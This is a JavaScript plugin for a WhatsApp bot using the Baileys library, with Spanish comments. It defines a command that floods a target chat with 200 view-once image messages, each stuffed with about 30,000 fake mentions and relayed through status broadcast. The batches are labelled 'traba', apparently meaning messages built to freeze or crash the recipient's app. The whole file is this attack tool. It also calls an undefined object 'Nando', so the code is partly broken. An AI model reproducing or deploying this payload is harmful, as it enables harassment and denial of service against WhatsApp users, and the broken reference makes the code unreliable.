import { generateWAMessageFromContent } from '@whiskeysockets/baileys';

let handler = async (m, { conn }) => {
  // Logs para depurar en consola
  console.log('m.sender:', m.sender);
  console.log('conn.user.id:', conn.user.id);

  // Función para normalizar el jid (sacar número, pasar a minúsculas y quitar espacios)
  let normalizeJid = jid => jid?.toString()?.trim()?.toLowerCase()?.split('@')[0];

  const senderNumber = normalizeJid(m.sender);
  const botNumber = normalizeJid(conn.user.id);

  if (senderNumber !== botNumber) {
    return m.reply('❌ Solo el número donde está vinculado el bot puede ejecutar este comando.');
  }

  const jid = m.chat;

  m.reply('Ejecutando el comando en tandas durante 5 minutos 😼');

  const mensajesPorTanda = 20;
  const totalMensajes = 200;
  const tandas = totalMensajes / mensajesPorTanda;
  const intervaloTanda = 30000; // 30 segundos entre cada tanda

  for (let i = 0; i < tandas; i++) {
    setTimeout(() => {
      enviarTandaIsagi(conn, jid, i + 1, m);
    }, i * intervaloTanda);
  }
};

handler.command = /^ñoño$/i;
export default handler;

// Función para pausar (delay)
function delay(ms) {
  return new Promise(res => setTimeout(res, ms));
}

// Función que envía el mensaje invisible (tu función original)
async function isagivisble1(target, mention) {
  const generateMessage = {
    viewOnceMessage: {
      message: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
          mimetype: "image/jpeg",
          caption: "🐉 𝐈𝐬𝐚𝐠𝐢 𝐈𝐧𝐟𝐢𝐧𝐢𝐭𝐲 🐉",
          fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
          fileLength: "19769",
          height: 354,
          width: 783,
          mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
          fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
          directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
          mediaKeyTimestamp: "1743225419",
          jpegThumbnail: null,
          scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
          scanLengths: [2437, 17332],
          contextInfo: {
            mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
            isSampled: true,
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true
          }
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(target, generateMessage, {});
  await Nando.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta", attrs: {}, content: [{
        tag: "mentioned_users", attrs: {}, content: [{
          tag: "to", attrs: { jid: target }, content: undefined
        }]
      }]
    }]
  });

  if (mention) {
    await Nando.relayMessage(target, {
      statusMentionMessage: {
        message: { protocolMessage: { key: msg.key, type: 25 } }
      }
    }, {
      additionalNodes: [{
        tag: "meta",
        attrs: { is_status_mention: "🐉 𝐈𝐬𝐚𝐠𝐢 𝐈𝐧𝐟𝐢𝐧𝐢𝐭𝐲 🐉" },
        content: undefined
      }]
    });
  }

  return msg;
}

// Función que envía una tanda de 20 mensajes
async function enviarTandaIsagi(conn, jid, num, m) {
  try {
    for (let i = 0; i < 20; i++) {
      const msg = await isagivisble1(jid, false);
      await delay(1000); // Espera 1 segundo entre mensajes
      await conn.sendMessage(conn.user.id, { delete: msg.key });
    }

    await conn.sendMessage(m.chat, {
      text: `🐢 traba ${num}/10 enviada correctamente.`,
    }, { quoted: m });

  } catch (e) {
    console.error("❌ Error en tanda:", e);
    await conn.sendMessage(m.chat, {
      text: "❌ Error en tanda:\n" + e.message,
    }, { quoted: m });
  }
}